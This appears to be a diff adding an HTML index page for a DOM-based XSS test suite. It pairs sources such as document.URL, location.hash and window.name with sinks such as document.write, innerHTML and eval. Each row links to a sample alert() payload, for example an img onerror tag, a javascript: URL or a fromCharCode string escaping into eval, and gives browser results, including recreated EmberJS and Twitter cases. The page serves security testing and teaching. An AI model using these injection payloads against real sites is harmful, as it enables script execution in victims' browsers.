@@ -1,0 +1,442 @@
+﻿  <!DOCTYPE html>
+
+  <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta charset="utf-8" />
+    <title> DOM XSS Tests</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+  </head>
+  <body>
+
+    <h1 align="center">DOM-Based XSS Test Cases</h1>
+
+    <h3 align="center">This web presents a set of sources and sinks combinations <br>
+      that could potentially cause DOM-Based XSS vulnerabilities</h3>
+      <hr>
+      <div class="container-fluid">
+        <div class="row">
+          <div class="col-md-12">
+            <h1>Source: <br> document.URL</h1>
+
+            <table class="table table-striped">
+              <thead>
+                <tr>
+                  <th class="col-md-1">Sink</th>
+                  <th class="col-md-3">Sample attack</th>
+                  <th class="col-md-4">Description</th>
+                  <th class="col-md-1 text-center">Firefox</th>
+                  <th class="col-md-1 text-center">Chrome</th>
+                  <th class="col-md-1 text-center">Edge</th>
+                  <th class="col-md-1 text-center">IE</th>  
+                </tr>
+              </thead>
+              <tbody>
+
+                <tr>
+                  <td><p>Document.write</p></td>
+                  <td><a href="static/document.URL/document_write.html#&lt;img src=foo onerror=alert(123)&gt;">document_write.html#&lt;img src=foo onerror=alert(123)&gt;</a></td>
+                  <td><b>document.write</b> with an unfiltered value from document.URL</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tr>
+
+                <tr>
+                  <td><p>element.innerHTML</p></td>
+                  <td><a href="static/document.URL/innerhtml.html#&lt;img src=foo onerror=alert(123)&gt;">innerhtml.html#&lt;img src=foo onerror=alert(123)&gt;</a></td>
+                  <td><b>element.innerhtml</b> with an unfiltered value from document.URL.</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tr>
+
+                <tr>
+                  <td><p>element.SetAttribute()</p></td>
+                  <td><a href="static/document.URL/setattribute.html?url=javascript:alert(1)">setattribute.html?url=javascript:alert(1)</a></td>
+                  <td><b>element.setAttribute(href,)</b> with an unfiltered value from document.URL.</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tr>
+
+                <tr>
+                  <td><p>Eval()</p></td>
+                  <td><a href="static/document.URL/eval.html?pid=3');eval(String.fromCharCode(97,108,101,114,116,40,39,104,105,39,41))//">eval.html?pid=3');eval(String.fromCharCode(97,108,101,114,116,40,39,104,105,39,41))//</a></td>
+                  <td><b>eval</b> with an unfiltered value from document.URL.</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tr>
+
+                <tr>
+                  <td><p>ScriptElement.onclick()</p></td>
+                  <td><a href="static/document.URL/onclick.html?pid=3');eval(String.fromCharCode(97,108,101,114,116,40,39,104,105,39,41))//">onclick.html?pid=3');eval(String.fromCharCode(97,108,101,114,116,40,39,104,105,39,41))//</a></td>
+                  <td><b>element.onclick</b> with an unfiltered value from document.URL.</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tr>
+
+                <tr>
+                  <td><p>Location.replace</p></td>
+                  <td><a href="static/document.URL/locationreplace.html?q=javascript:alert()">locationreplace.html?q=javascript:alert()</a></td>
+                  <td><b>location.replace</b> with an unfiltered value from document.URL.</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tr>
+
+              </tbody>
+            </table>
+
+            <h1>Source: <br> document.documentURI</h1>
+            <table class="table table-striped">
+              <thead>
+                <tr>
+                  <th class="col-md-1">Sink</th>
+                  <th class="col-md-3">Sample attack</th>
+                  <th class="col-md-4">Description</th>
+                  <th class="col-md-1 text-center">Firefox</th>
+                  <th class="col-md-1 text-center">Chrome</th>
+                  <th class="col-md-1 text-center">Edge</th>
+                  <th class="col-md-1 text-center">IE</th>  
+                </tr>
+
+                <tr>
+                  <td><p>Document.write</p></td>
+                  <td><a href="static/document.documentURI/document_write.html#&lt;img src=foo onerror=alert(123)&gt;">document_write.html#&lt;img src=foo onerror=alert(123)&gt;</a></td>
+                  <td><b>document.write</b> with an unfiltered value from document.documentURI</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tr>
+
+                <tr>
+                  <td><p>element.innerHTML</p></td>
+                  <td><a href="static/document.documentURI/innerhtml.html#&lt;img src=foo onerror=alert(123)&gt;">innerhtml.html#&lt;img src=foo onerror=alert(123)&gt;</a></td>
+                  <td><b>element.innerhtml</b> with an unfiltered value from document.documentURI.</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tr>
+
+                <tr>
+                  <td><p>Eval()</p></td>
+                  <td><a href="static/document.documentURI/eval.html?pid=3');eval(String.fromCharCode(97,108,101,114,116,40,39,104,105,39,41))//">eval.html?pid=3');eval(String.fromCharCode(97,108,101,114,116,40,39,104,105,39,41))//</a></td>
+                  <td><b>eval</b> with an unfiltered value from document.documentURI</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tr>
+              </thead>
+              <tbody>
+
+
+              </tbody>
+            </table>
+
+
+            <h1>Source: <br> location.href</h1>
+            <table class="table table-striped">
+              <thead>
+                <tr>
+                  <th class="col-md-1">Sink</th>
+                  <th class="col-md-3">Sample attack</th>
+                  <th class="col-md-4">Description</th>
+                  <th class="col-md-1 text-center">Firefox</th>
+                  <th class="col-md-1 text-center">Chrome</th>
+                  <th class="col-md-1 text-center">Edge</th>
+                  <th class="col-md-1 text-center">IE</th>  
+                </tr>
+              </thead>
+              <tbody>
+                <td><p>document.write</p></td>
+                <td><a href="static/location.href/document.write.html?default=%3Cscript%3Ealert(%27hi%27)%3C/script%3E">document.write.html?default=&lt;script&gt;alert(hi)&lt;/script&gt;</a>
+                  <td><p><b>document.write</b> with decoded input value from location.href.</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tbody>
+              </table>
+
+              <h1>Source: <br> location.search</h1>
+              <table class="table table-striped">
+                <thead>
+                  <tr>
+                    <th class="col-md-1">Sink</th>
+                    <th class="col-md-3">Sample attack</th>
+                    <th class="col-md-4">Description</th>
+                    <th class="col-md-1 text-center">Firefox</th>
+                    <th class="col-md-1 text-center">Chrome</th>
+                    <th class="col-md-1 text-center">Edge</th>
+                    <th class="col-md-1 text-center">IE</th>  
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td><p>document.write</p></td>
+                    <td><a href="static/location.search/document.write.html?<svg/onload=alert(1)">document.write.html?&lt;svg/onload=alert(1)</a></td>
+                    <td><p><b>document.write</b> with unfiltered value from location.search</td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  </tr>
+                  <tr>
+                  <td><p>window.setInterval</p></td>
+                    <td><a href="static/location.search/setInterval.html">setInterval.html</a></td>
+                    <td><p><b>window.setInterval</b> with unfiltered value from location.search</td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  </tr>
+
+                  </tbody>
+                </table>
+
+
+                <h1>Source: <br> location.hash</h1>
+                <table class="table table-striped">
+                  <thead>
+                    <tr>
+                      <th class="col-md-1">Sink</th>
+                      <th class="col-md-3">Sample attack</th>
+                      <th class="col-md-4">Description</th>
+                      <th class="col-md-1 text-center">Firefox</th>
+                      <th class="col-md-1 text-center">Chrome</th>
+                      <th class="col-md-1 text-center">Edge</th>
+                      <th class="col-md-1 text-center">IE</th>  
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td>location.replace</td>
+                      <td><a href="static/location.hash/location.replace.html#Javascript:alert(0)">location.html#Javascript:alert(0)</a></td>
+                      <td><p><b>location.replace </b>with unfiltered value from location.hash</td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+
+
+                    </tr>
+                    <tr>
+                      <td>document.write</td>
+                      <td><a href="static/location.hash/document.write.html#<script>alert()</script>">document.write.html#alert()</a></td>
+                      <td><p><b>document.write </b> with unfiltered value from location.hash.</td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+
+                    </tbody>
+                  </table>
+
+                  <h1>Source: <br> location.pathname</h1>
+                  <table class="table table-striped">
+                    <thead>
+                     <tr>
+                      <th class="col-md-1">Sink</th>
+                      <th class="col-md-3">Sample attack</th>
+                      <th class="col-md-4">Description</th>
+                      <th class="col-md-1 text-center">Firefox</th>
+                      <th class="col-md-1 text-center">Chrome</th>
+                      <th class="col-md-1 text-center">Edge</th>
+                      <th class="col-md-1 text-center">IE</th>   
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td>jQuery.html</td>
+                      <td><a href="static/location.pathname/jQuery.html/?Javascript:alert('Hi you are vulnerable!')">jQuery.html?q=Javascript:alert()"</a></td>
+                      <td></td>
+                       <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                      <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                    </tr>
+                  </tbody>
+              </table>
+
+              <h1>Source: <br> window.name</h1>
+              <table class="table table-striped">
+                <thead>
+                  <tr>
+                    <th class="col-md-1">Sink</th>
+                    <th class="col-md-3">Sample attack</th>
+                    <th class="col-md-4">Description</th>
+                    <th class="col-md-1 text-center">Firefox</th>
+                    <th class="col-md-1 text-center">Chrome</th>
+                    <th class="col-md-1 text-center">Edge</th>
+                    <th class="col-md-1 text-center">IE</th>   
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td><p>document.write</p></td>
+                    <td><a href="/static/window.name/document_write.html">document_write.html</a></td>
+                    <td><p><b>document.write </b> with unfiltered value from window.name</td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                    <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  </tr>
+
+                </tbody>
+              </table>
+
+              <h1>Source: <br> window.top</h1>
+              <table class="table table-striped">
+                <thead>
+                  <tr>
+                    <th class="col-md-1">Sink</th>
+                    <th class="col-md-3">Sample attack</th>
+                    <th class="col-md-4">Description</th>
+                    <th class="col-md-1 text-center">Firefox</th>
+                    <th class="col-md-1 text-center">Chrome</th>
+                    <th class="col-md-1 text-center">Edge</th>
+                    <th class="col-md-1 text-center">IE</th>   
+                  </tr>
+                </thead>
+                <tbody>
+
+
+                </tbody>
+              </table>
+
+
+              <h1>Source: <br> document.referrer</h1>
+              <table class="table table-striped">
+                <thead>
+                  <tr>
+                    <th class="col-md-1">Sink</th>
+                    <th class="col-md-3">Sample attack</th>
+                    <th class="col-md-4">Description</th>
+                    <th class="col-md-1 text-center">Firefox</th>
+                    <th class="col-md-1 text-center">Chrome</th>
+                    <th class="col-md-1 text-center">Edge</th>
+                    <th class="col-md-1 text-center">IE</th>   
+                  </tr>
+
+                </thead>
+                <tbody>
+                 <tr>
+                  <td><p>element.innerhtml</p></td>
+                  <td><a href="static/document.referrer/innerHtml.html?<img%20src=x%20onerror=alert(9)>?" >innerHtml.html.html?q=javascript:alert()</a></td>
+                  <td><b>element.innerhtml</b> with an unfiltered value from referrer</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                </tr>
+              </tbody>
+            </table>
+
+
+            <h1>Source: <br> localStorage</h1>
+            <table class="table table-striped">
+              <thead>
+                <tr>
+                  <th class="col-md-1">Sink</th>
+                  <th class="col-md-3">Sample attack</th>
+                  <th class="col-md-4">Description</th>
+                  <th class="col-md-1 text-center">Firefox</th>
+                  <th class="col-md-1 text-center">Chrome</th>
+                  <th class="col-md-1 text-center">Edge</th>
+                  <th class="col-md-1 text-center">IE</th>   
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><p>Document.writeln</p></td>
+                  <td><a href="static/localStorage/document_writeln.html">document_writeln.html</a></td>
+                  <td><b>document.writeln</b> with an unfiltered value from localStorage.</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+
+                </tr>
+
+              </tbody>
+            </table>
+
+            <h1>Source: <br> document.cookie</h1>
+            <table class="table table-striped">
+              <thead>
+                <tr>
+                  <th class="col-md-1">Sink</th>
+                  <th class="col-md-3">Sample attack</th>
+                  <th class="col-md-4">Description</th>
+                  <th class="col-md-1 text-center">Firefox</th>
+                  <th class="col-md-1 text-center">Chrome</th>
+                  <th class="col-md-1 text-center">Edge</th>
+                  <th class="col-md-1 text-center">IE</th>   
+                </tr>
+              </thead>
+              <tbody>
+
+              </tbody>
+            </table>
+
+            <h1>Some real examples:</h1>
+            <table class="table table-striped">
+              <thead>
+                <tr>
+                  <th class="col-md-1">Sink</th>
+                  <th class="col-md-3">Sample attack</th>
+                  <th class="col-md-4">Description</th>
+                  <th class="col-md-1 text-center">Firefox</th>
+                  <th class="col-md-1 text-center">Chrome</th>
+                  <th class="col-md-1 text-center">Edge</th>
+                  <th class="col-md-1 text-center">IE</th>   
+                </tr>
+              </thead>
+              <tbody>
+
+                <tr>
+                  <td><p>Ember js Dom-XSS</p></td>
+                  <td><a href="static/real/emberjs.html#?query=&lt;img src=x onerror=alert(0)&gt;">emberjs.html?query=&lt;img src=x onerror=alert(0)&gt;</a></td>
+                  <td>Real example based on a vulnerability found in EmberJS with an unfiltered value from location.href</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:red;">clear</i></td>
+
+                </tr>
+
+                <tr>
+                  <td><p>Twitter hashbang dom-xss</p></td>
+                  <td><a href="static/real/twitter.html/#!javascript:alert(1)">twitter.html/#!javascript:alert(1)</a></td>
+                  <td>Real example based on a vulnerability found in Twitter using the old Hashbang method with an unfiltered value from location.href</td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+                  <td class="text-center"><i class="material-icons" style="font-size:24px;color:green;">done</i></td>
+
+                </tr>
+
+              </tbody>
+            </table>
+
+          </div>
+        </div>
+      </div>
+
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+      
+    </body>
+    </html>
